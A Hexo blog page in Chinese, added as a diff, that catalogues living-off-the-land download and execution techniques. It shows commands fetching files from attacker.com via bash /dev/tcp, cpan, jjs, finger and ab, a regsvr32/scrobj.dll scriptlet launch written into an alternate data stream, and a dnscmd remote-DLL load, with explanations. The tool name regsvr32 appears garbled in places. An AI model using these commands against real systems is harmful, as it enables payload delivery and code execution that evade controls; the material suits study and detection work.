@@ -1,0 +1,348 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>阿巴 | 阿巴</title><meta name="author" content="阿巴"><meta name="copyright" content="阿巴"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="离地攻击分析“离地攻击”（Out-of-Band (OOB) Attack）是一种网络攻击技术，它利用网络协议的一些特定特性或漏洞，将攻击数据（通常是恶意指令或数据）传输到一个受害系统上，并从受害系统上以某种形式获取响应。与传统的攻击方式不同，离地攻击通常不直接依赖于与目标系统之间的直接交互，而是利用系统与其他网络实体进行通信的能力。 Linux构造函数linux 里可以把一些重复使用的命令封装成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="阿巴">
+<meta property="og:url" content="http://example.com/2024/05/25/%E7%A6%BB%E5%9C%B0%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="阿巴">
+<meta property="og:description" content="离地攻击分析“离地攻击”（Out-of-Band (OOB) Attack）是一种网络攻击技术，它利用网络协议的一些特定特性或漏洞，将攻击数据（通常是恶意指令或数据）传输到一个受害系统上，并从受害系统上以某种形式获取响应。与传统的攻击方式不同，离地攻击通常不直接依赖于与目标系统之间的直接交互，而是利用系统与其他网络实体进行通信的能力。 Linux构造函数linux 里可以把一些重复使用的命令封装成">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2024-05-25T13:45:31.454Z">
+<meta property="article:modified_time" content="2024-05-26T09:02:51.377Z">
+<meta property="article:author" content="阿巴">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/05/25/%E7%A6%BB%E5%9C%B0%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '阿巴',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-05-26 17:02:51'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="阿巴"><span class="site-name">阿巴</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Untitled</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-05-25T13:45:31.454Z" title="Created 2024-05-25 21:45:31">2024-05-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-05-26T09:02:51.377Z" title="Updated 2024-05-26 17:02:51">2024-05-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="离地攻击分析"><a href="#离地攻击分析" class="headerlink" title="离地攻击分析"></a>离地攻击分析</h1><p>“离地攻击”（Out-of-Band (OOB) Attack）是一种网络攻击技术，它利用网络协议的一些特定特性或漏洞，将攻击数据（通常是恶意指令或数据）传输到一个受害系统上，并从受害系统上以某种形式获取响应。与传统的攻击方式不同，离地攻击通常不直接依赖于与目标系统之间的直接交互，而是利用系统与其他网络实体进行通信的能力。</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p><code>linux</code> 里可以把一些重复使用的命令封装成一个集合,之后可以使用函数名调用，因此我们可以自己写一 个download函数，大概原理就是使用&#x2F;dev&#x2F;tcp设备文件与服务器建立TCP连接，并发送HTTP请求获取文件内容，最后将文件内容打印到标准输出，最后把输出重定向就可以获得文件了。</p>
+<p>所需权限：任意</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">function</span> <span class="token function-name function">DOWNLOAD</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token assign-left variable">url</span><span class="token operator">=</span><span class="token variable">$1</span>
+<span class="token assign-left variable">proto</span><span class="token operator">=</span><span class="token string">"http://"</span>
+<span class="token assign-left variable">host</span><span class="token operator">=</span><span class="token variable">$&#123;url<span class="token operator">/</span>$proto<span class="token operator">/</span>&#125;</span>
+<span class="token assign-left variable">server</span><span class="token operator">=</span><span class="token variable">$&#123;host<span class="token operator">%%</span><span class="token operator">/</span>*&#125;</span>
+<span class="token assign-left variable">path</span><span class="token operator">=</span><span class="token variable">$&#123;host<span class="token operator">#</span>*<span class="token operator">/</span>&#125;</span>
+<span class="token assign-left variable">DOC</span><span class="token operator">=</span>/<span class="token variable">$&#123;path<span class="token operator">/</span><span class="token operator">/</span> <span class="token operator">/</span>&#125;</span>
+<span class="token assign-left variable">HOST</span><span class="token operator">=</span><span class="token variable">$&#123;server<span class="token operator">/</span><span class="token operator">:</span>*<span class="token operator">/</span>&#125;</span>
+<span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token variable">$&#123;server<span class="token operator">/</span>*<span class="token operator">:</span><span class="token operator">/</span>&#125;</span>
+<span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token variable">$&#123;PORT&#125;</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">80</span>
+<span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span> PORT <span class="token operator">+</span> <span class="token number">0</span> <span class="token variable">))</span></span>
+<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">3</span>&lt;></span>/dev/tcp/<span class="token variable">$&#123;HOST&#125;</span>/<span class="token variable">$&#123;PORT&#125;</span>
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-en</span> <span class="token string">"GET <span class="token variable">$&#123;DOC&#125;</span> HTTP/1.0<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Host: <span class="token variable">$&#123;HOST&#125;</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;3</span>
+<span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line <span class="token punctuation">;</span> <span class="token keyword">do</span>
+<span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$&#123;line&#125;</span>"</span> <span class="token operator">==</span> <span class="token string">$'<span class="token entity" title="\r">\r</span>'</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">break</span>
+<span class="token keyword">done</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;3</span>
+<span class="token assign-left variable">nul</span><span class="token operator">=</span><span class="token string">'\0'</span>
+<span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-d</span> <span class="token string">''</span> <span class="token parameter variable">-r</span> x <span class="token operator">||</span> <span class="token punctuation">&#123;</span> <span class="token assign-left variable">nul</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$x</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
+<span class="token builtin class-name">printf</span> <span class="token string">"%s<span class="token variable">$&#123;nul&#125;</span>"</span> <span class="token string">"<span class="token variable">$&#123;x&#125;</span>"</span>
+<span class="token keyword">done</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;3</span>
+<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">3</span>>&amp;</span>-
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>除了这个创建函数下载文件之外，还能有其他的方法，比如换一种语言啥的。</p>
+<h3 id="cpan"><a href="#cpan" class="headerlink" title="cpan"></a>cpan</h3><p><code>cpan</code> 命令是 Perl 编程语言中的一个重要工具，用于管理 Perl 模块的安装、升级和移除。它是 Comprehensive Perl Archive Network (CPAN) 的客户端工具，通过 CPAN，开发者可以访问并获取到大量的 Perl 模块、工具和文档。</p>
+<p><strong>命令条件：</strong>无论是在开发环境、生产环境还是个人计算机上，只要安装了 Perl 解释器，就可以使用 <code>cpan</code> 命令来管理 Perl 模块。它是 Perl 开发者的重要工具之一，为他们提供了方便快捷的方式来获取、安装和管理 Perl 模块。</p>
+<p><strong>参考实际使用时命令：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">export URL&#x3D;http:&#x2F;&#x2F;attacker.com&#x2F;file_to_get &amp;&amp; cpan -MFile::Fetch -e &#39;my $file &#x3D; (File::Fetch-&gt;new(uri &#x3D;&gt; &quot;$ENV&#123;URL&#125;&quot;))-&gt;fetch();&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>让我们逐步解释这个命令：</strong></p>
+<ol>
+<li><code>export URL=attacker.com/file_to_get</code>: 这部分命令使用 <code>export</code> 关键字将一个环境变量 <code>URL</code> 设置为 <code>attacker.com/file_to_get</code>，即要下载的文件的 URL。</li>
+<li><code>cpan -MFile::Fetch -e &#39;...&#39;</code>: 这部分命令调用了 <code>cpan</code> 命令，并使用 <code>-M</code> 选项加载了 <code>File::Fetch</code> 模块。接着，使用 <code>-e</code> 选项执行了一个 Perl 表达式。</li>
+<li><code>&#39;my $file = (File::Fetch-&gt;new(uri =&gt; &quot;$ENV&#123;URL&#125;&quot;))-&gt;fetch();&#39;</code>: 这个 Perl 表达式使用 <code>File::Fetch</code> 模块创建了一个新的 <code>File::Fetch</code> 对象，指定了要下载的文件的 URI，即使用了之前设置的环境变量 <code>URL</code>。然后调用 <code>fetch()</code> 方法来下载文件，并将其保存到当前目录下。下载完成后，返回的文件路径会赋值给变量 <code>$file</code>。</li>
+</ol>
+<h3 id="jjs"><a href="#jjs" class="headerlink" title="jjs"></a>jjs</h3><p><code>jjs</code> 是一个命令行工具，用于执行 JavaScript 代码。它是 Oracle JDK 8 及其以后的版本中包含的 <code>Nashorn JavaScript</code> 引擎的一部分。<code>Nashorn</code> 允许在 JVM 上运行 JavaScript 代码，<code>jjs</code> 则提供了一个方便的方式来使用这一功能。</p>
+<p><strong>命令条件：</strong> JDK 8 —— JDK 14 ，JDK 15 后被移除。</p>
+<p><strong>参考实际使用时命令：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">export URL&#x3D;http:&#x2F;&#x2F;attacker.com&#x2F;file_to_get
+export LFILE&#x3D;file_to_save
+echo &quot;var URL &#x3D; Java.type(&#39;java.net.URL&#39;);
+var ws &#x3D; new URL(&#39;$URL&#39;);
+var Channels &#x3D; Java.type(&#39;java.nio.channels.Channels&#39;);
+var rbc &#x3D; Channels.newChannel(ws.openStream());
+var FileOutputStream &#x3D; Java.type(&#39;java.io.FileOutputStream&#39;);
+var fos &#x3D; new FileOutputStream(&#39;$LFILE&#39;);
+fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
+fos.close();
+rbc.close();&quot; | jjs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>让我们逐步解释这个命令：</strong></p>
+<ol>
+<li><code>export URL=attacker.com/file_to_get</code>: 这部分命令使用 <code>export</code> 关键字将一个环境变量 <code>URL</code> 设置为 <code>attacker.com/file_to_get</code>，即要下载的文件的 URL。</li>
+<li><code>export LFILE=file_to_save</code>: 这一行设置了另一个环境变量 <code>LFILE</code>，指定了要保存下载文件的路径和文件名。</li>
+<li><code>echo &quot;...&quot; | jjs</code>: 这部分命令使用 <code>echo</code> 命令将一段 JavaScript 代码传递给 <code>jjs</code> 命令执行，即通过 Nashorn JavaScript 引擎执行 JavaScript 代码。</li>
+<li>JavaScript 代码段：这段 JavaScript 代码实现了从指定 URL 下载文件并保存到本地的功能。<ul>
+<li>首先，通过 Java 类 <code>java.net.URL</code> 和 <code>java.nio.channels.Channels</code> 打开 URL 的输入流，并创建文件输出流。</li>
+<li>然后，使用 <code>transferFrom()</code> 方法将从 URL 输入流读取的数据写入到文件输出流中。</li>
+<li>最后，关闭输入流和输出流，完成文件下载和保存的过程。</li>
+</ul>
+</li>
+</ol>
+<h3 id="finger"><a href="#finger" class="headerlink" title="finger"></a>finger</h3><p><code>finger</code> 命令通常用于系统管理员查询当前登录用户的信息，以及查看其他用户的状态和活动。同时，攻击者可能会使用 <code>finger</code> 命令来收集有关目标系统上用户的信息，以进行进一步的攻击。因此，在安全意识培训中，通常会建议限制或禁用 <code>finger</code> 命令的使用，以防止泄露敏感信息。</p>
+<p><strong>语法：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">finger [选项] [用户名]@[主机名]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>参考实际使用时命令：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">finger x@attacker.com | base64 -d &gt; file_to_save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>让我们逐步解释这个命令：</strong></p>
+<ol>
+<li><code>finger x@attacker.com</code>: 这部分命令使用 <code>finger</code> 命令查询名为 <code>x</code> 的用户在 <code>attacker.com</code> 主机上的信息。<code>finger</code> 命令通常用于获取远程系统上的用户信息，包括登录名、用户主目录、登录时间等。在这里，<code>x</code> 是指定的用户，<code>attacker.com</code> 是目标主机的域名或 IP 地址。</li>
+<li><code>base64 -d &gt; file_to_save</code>: 这部分命令将 <code>finger</code> 命令的输出进行了解码，并将结果保存到名为 <code>file_to_save</code> 的文件中。<code>base64 -d</code> 命令用于对输入进行 Base64 解码，<code>&gt;</code> 符号用于将解码后的内容重定向到指定的文件中。</li>
+</ol>
+<p>这个命令的作用是查询远程主机 <code>attacker.com</code> 上用户 <code>x</code> 的信息，并将其解码后保存到本地文件 <code>file_to_save</code> 中。</p>
+<h3 id="ab"><a href="#ab" class="headerlink" title="ab"></a>ab</h3><p><code>ab</code>（ApacheBench）是一个用于性能测试的命令行工具，通常用于测试 HTTP 服务器的负载能力和性能。它是 Apache HTTP 服务器的附属工具，但可以用来测试任何 HTTP 服务器的性能。<code>ab</code> 通过模拟多个并发请求来衡量服务器在特定负载下的响应能力。</p>
+<p><strong>语法：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">ab [options] [http[s]:&#x2F;&#x2F;]hostname[:port]&#x2F;path<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>参考实际使用时命令：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">ab -v2 http:&#x2F;&#x2F;attacker.com&#x2F;file_to_download<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>让我们逐步解释这个命令：</strong></p>
+<ol>
+<li><code>ab</code>: 这是 ApacheBench 工具的命令，用于执行 HTTP 性能测试。</li>
+<li><code>-v2</code>: 这个选项设置了详细级别为 2，表示输出详细的调试信息。在详细级别 2 下，<code>ab</code> 将会输出更多关于请求和响应的详细信息，包括请求头、响应头以及连接信息。</li>
+<li><code>attacker.com/file_to_download</code>: 这是要进行性能测试的目标 URL，即要下载的文件的 URL。<code>ab</code> 将向该 URL 发起 HTTP 请求，并测量服务器的响应时间、吞吐量等性能指标。</li>
+</ol>
+<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="CMD-EXE"><a href="#CMD-EXE" class="headerlink" title="CMD.EXE"></a>CMD.EXE</h3><p><code>CMD</code>（命令提示符）是 Windows 操作系统中的命令行解释器。它提供了一个交互式的命令行界面，允许用户输入命令来执行各种操作，例如管理文件和目录、运行程序、配置系统设置等。</p>
+<p><strong>所需权限：user</strong></p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">C:\Windows\System32\cmd.exe
+C:\Windows\SysWOW64\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>可用于的系统：</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10、Windows 11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>参考实际使用时命令：</strong></p>
+<blockquote>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">cmd.exe &#x2F;c echo regsvcjMy.exe ^&#x2F;s ^&#x2F;u ^&#x2F;i:https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;redcanaryco&#x2F;atomic-red-team&#x2F;master&#x2F;atomics&#x2F;T1218.010&#x2F;src&#x2F;RegSvcjMy.sct ^scrobj.dll &gt; fakefile.doc:payload.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<blockquote>
+<p>创建一个名为 “fakefile.doc” 的文件，并将一个命令写入其中。这个命令的目的是利用 regsvcjMy.exe 来执行一个注册表脚本文件，这个脚本文件来源于一个 URL（<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvcjMy.sct</a>）。具体来说，这个脚本文件将以系统用户的身份运行一个名为 “scrobj.dll” 的文件。</p>
+<p>在这个命令中，”&#x2F;c” 表示执行命令并终止。echo命令用于创建fakefile.doc文件并写入内容。在写入的内容中，”^” 用于转义特殊字符，以确保它们被正确解释。最后，命令将写入一个名为 payload.bat 的批处理文件，其中包含用于执行上述注册表脚本文件的命令。</p>
+</blockquote>
+<p><strong>cmd执行命令请求的URL中的文件为：</strong></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?XML version="1.0"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scriptlet</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+<span class="token operator">&lt;</span>registration 
+progid<span class="token operator">=</span><span class="token string">"PoC"</span>
+classid<span class="token operator">=</span><span class="token string">"&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;"</span> <span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> regsvcjMy <span class="token operator">/</span>s <span class="token operator">/</span>u <span class="token operator">/</span>i<span class="token operator">:</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>file<span class="token punctuation">.</span>sct scrobj<span class="token punctuation">.</span>dll <span class="token operator">--</span><span class="token operator">></span>
+
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token punctuation">.</span>sct files when downloaded<span class="token punctuation">,</span> are executed from a path like <span class="token keyword">this</span> <span class="token operator">--</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Please Note<span class="token punctuation">,</span> file extenstion does not matter <span class="token operator">--</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Though<span class="token punctuation">,</span> the name and extension are arbitary<span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">--</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> c<span class="token operator">:</span>\users\<span class="token constant">USER</span>\appdata\local\microsoft\windows\temporary internet files\content<span class="token punctuation">.</span>ie5\2vcqsj3k\file<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sct <span class="token operator">--</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> Based on current research<span class="token punctuation">,</span> no registry keys are written<span class="token punctuation">,</span> since call <span class="token string">"uninstall"</span> <span class="token operator">--</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> You can either execute locally<span class="token punctuation">,</span> or from a url <span class="token operator">--</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"JScript"</span><span class="token operator">></span>
+</span><span class="token included-cdata"><span class="token cdata">&lt;![CDATA[</span><span class="token language-javascript">
+<span class="token comment">// calc.exe should launch, this could be any arbitrary code.</span>
+<span class="token comment">// What you are hoping to catch is the cmdline, modloads, or network connections, or any variation</span>
+<span class="token keyword">var</span> r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WScript.Shell"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+</span><span class="token cdata">]]></span></span><span class="token language-javascript">
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>registration</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scriptlet</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>这个脚本会通过调用<code>WScript.Shell</code>对象的 Run 方法来执行<code>calc.exe</code>（Windows 计算器），并且这段 JScript 代码被包含在 CDATA 部分中，以防止 XML 解析器尝试解析其中的特殊字符。</p>
+<p>在脚本的注释中还提到，SCT 文件在下载后会被保存到临时 Internet 文件夹，并且在当前研究的基础上，并不会写入任何注册表键，因为它会调用 “uninstall”。这意味着脚本可能只是用于执行一些特定的操作，而不是将自身添加到系统中。</p>
+</blockquote>
+<h3 id="DNSCMD-EXE"><a href="#DNSCMD-EXE" class="headerlink" title="DNSCMD.EXE"></a>DNSCMD.EXE</h3><p><code>DNSCMD</code>是 Windows 中用于管理 DNS 服务器的命令行工具。它允许管理员通过命令行执行各种 DNS 相关的操作，例如管理区域、记录、缓存等。</p>
+<p><strong>所需权限：DNS admin</strong></p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">C:\Windows\System32\Dnscmd.exe
+C:\Windows\SysWOW64\Dnscmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>可用于系统：</strong></p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Windows 服务器<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>参考实际使用时命令：</strong></p>
+<blockquote>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">dnscmd.exe dc1.lab.int &#x2F;config &#x2F;serverlevelplugindll \\10.0.0.1\dll\wtf.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<blockquote>
+<p>将<code>wtf.dll</code>文件配置为 DNS 服务器<code>dc1.lab.int</code>的服务器级别插件，该 DLL 文件位于网络路径<code>\\10.0.0.1\dll\</code>下。一旦配置完成，DNS 服务器将加载并执行这个 DLL 文件，以提供额外的功能或修改 DNS 服务器的行为。</p>
+</blockquote>
+<h3 id="Dfsvc-exe"><a href="#Dfsvc-exe" class="headerlink" title="Dfsvc.exe"></a>Dfsvc.exe</h3><p><code>dfsvc.exe</code>是 Windows 中的一个可执行文件，它是<code>ClickOnce</code>部署服务的一部分。<code>ClickOnce</code>是微软提供的一种应用程序部署技术，可以用于快速、简便地部署.NET Framework 应用程序。主要作用是启动<code>ClickOnce</code>部署服务，并处理<code>ClickOnce</code>应用程序的下载、安装和更新过程。当用户尝试启动<code>ClickOnce</code>应用程序时，系统会调用<code>dfsvc.exe</code>来处理相关的任务。</p>
+<p><strong>所需权限：User</strong></p>
